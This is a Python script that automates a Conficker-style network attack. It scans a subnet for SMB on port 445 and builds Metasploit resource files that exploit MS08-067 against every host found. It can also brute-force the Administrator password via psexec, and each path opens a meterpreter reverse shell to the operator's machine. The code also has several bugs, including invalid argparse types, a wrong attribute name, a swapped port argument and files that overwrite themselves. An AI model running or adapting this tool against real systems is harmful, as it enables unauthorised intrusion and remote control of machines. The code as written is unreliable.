import subprocess
import argparse

import nmap


def findTargets(targetSubnet: str) -> list[str]:
    nmapScan: nmap.PortScanner = nmap.PortScanner()
    nmapScan.scan(targetSubnet, "445")
    targetHosts: list[str] = []
    
    for host in nmapScan.all_hosts():
        if nmapScan[host].has_tcp(445):
            state: str = nmapScan[host]["tcp"][445]["state"]
            if state == "open":
                print(f"[+] Found Target Host: {host}")
                targetHosts.append(host)
    return targetHosts

def setupHandler(configFile: str, localHost: str, localPort: str) -> None:
    with open(configFile, "w") as cf:
        cf.write("use exploit/multi/handler\n")
        cf.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
        cf.write(f"set LPORT {localPort}\n")
        cf.write(f"set LHOST {localHost}\n")
        cf.write("exploit -j -z\n")
        cf.write("setg DisablePayloadHandler l\n")

def confickerExploit(configFile: str, targetHost: str, localHost: str, localPort: str) -> None:
    with open(configFile, "w") as cf:
        cf.write("use exploit/windows/smb/ms08_067_netapi\n")
        cf.write(f"set RHOST {targetHost}\n")
        cf.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
        cf.write(f"set LPORT {localPort}\n")
        cf.write(f"set LHOST {localHost}\n")
        cf.write("exploit -j -z\n")

def smbBrute(configFile: str, targetHost: str, passwordFile: str, localHost: str, localPort: str) -> None:
    username: str = "Administrator"
    with open(passwordFile, "r") as pf:
        for password in pf.readlines():
            password = password.strip("\n").strip("\r")
            with open(configFile, "w") as cf:
                cf.write("use exploit/windows/smb/psexec\n")
                cf.write(f"set SMBUser {username}\n")
                cf.write(f"set SMBPass {password}\n")
                cf.write(f"set RHOST {targetHost}\n")
                cf.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
                cf.write(f"set LPORT {localPort}")
                cf.write(f"set LHOST {localHost}")
                cf.write("exploit -j -z\n")

def arguments() -> argparse.Namespace:
    parser: argparse.ArgumentParser = argparse.ArgumentParser(
        usage="-H <RHOST> -l <LHOST> [-p <LPORT> -F <PASSWORDFILE>]"
    )
    parser.add_argument(
        "-H", dest="targetSubnet", type="string", help="specify the target address[es]", required=True
        )
    parser.add_argument(
        "-p", dest="localPort", type="string", help="specify the listen port", default="1337"
    )
    parser.add_argument(
        "-l", dest="localHost", type="string", help="specify the listen address", required=True
    )
    parser.add_argument(
        "-F", dest="passwordFile", type="string", help="password file for SMB brute force attempt"
    )
    return parser.parse_args()

def main() -> None:
    configFile: str = "meta.rc"
    args: argparse.Namespace = arguments()
    
    targetSubnet: str = args.subNet
    localPort: str = args.localPort
    localHost: str = args.localHost
    passwordFile: str = args.passwordFile
    
    targetHosts = findTargets(targetSubnet=targetSubnet)
    setupHandler(configFile=configFile, localHost=localHost, localPort=localPort)
    for targetHost in targetHosts:
        confickerExploit(
            configFile=configFile,
            targetHost=targetHost,
            localHost=localHost,
            localPort=localHost
        )
        if passwordFile is not None:
            smbBrute(
                configFile=configFile,
                targetHost=targetHost,
                passwordFile=passwordFile,
                localHost=localHost,
                localPort=localPort
            )
    result: subprocess.CompletedProcess = subprocess.run(
        ["msfconsole", "-r", "meta.rc"],
        capture_output=True,
        text=True,
        check=True
    )
    print(result.stdout)

if __name__ == "__main__":
    main()